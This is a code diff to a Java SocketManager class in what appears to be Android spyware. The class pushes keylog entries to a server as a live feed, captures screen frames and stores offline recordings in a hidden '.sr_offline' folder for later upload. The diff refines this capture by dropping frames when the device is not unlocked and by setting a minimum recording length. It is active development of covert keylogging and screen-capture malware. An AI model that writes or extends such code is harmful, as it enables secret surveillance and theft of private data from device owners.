@@ -1858,6 +1858,17 @@ public class SocketManager {
         stopScreenReaderLoop(true);
     }
 
+    /**
+     * Called when the screen turns off WITHOUT the user unlocking.
+     * Discards the buffered frames — nothing useful was captured.
+     */
+    public void stopScreenReaderAutoNoSave() {
+        synchronized (offlineFrameBuffer) {
+            offlineFrameBuffer.clear();
+        }
+        stopScreenReaderLoop(true);
+    }
+
     /** Push a keylog entry to the server immediately (live feed) via live channel. */
     public void pushKeylogEntry(String packageName, String appName, String text, String eventType, String timestamp) {
         pushKeylogEntry(packageName, appName, text, eventType, timestamp, false, "");
@@ -2259,8 +2270,14 @@ public class SocketManager {
      * Save buffered offline frames to a local JSON file in the app's private storage.
      * The file will be uploaded to the server the next time the device connects.
      */
+    private static final int MIN_FRAMES_TO_SAVE = 3;
+
     private void saveOfflineRecording(java.util.ArrayList<JSONObject> frames, long startTime) {
-        if (frames == null || frames.isEmpty()) return;
+        if (frames == null || frames.size() < MIN_FRAMES_TO_SAVE) {
+            Log.d(TAG, "saveOfflineRecording: discarding — only " +
+                (frames == null ? 0 : frames.size()) + " frame(s), minimum is " + MIN_FRAMES_TO_SAVE);
+            return;
+        }
         try {
             java.io.File dir = new java.io.File(context.getFilesDir(), ".sr_offline");
             if (!dir.exists()) dir.mkdirs();
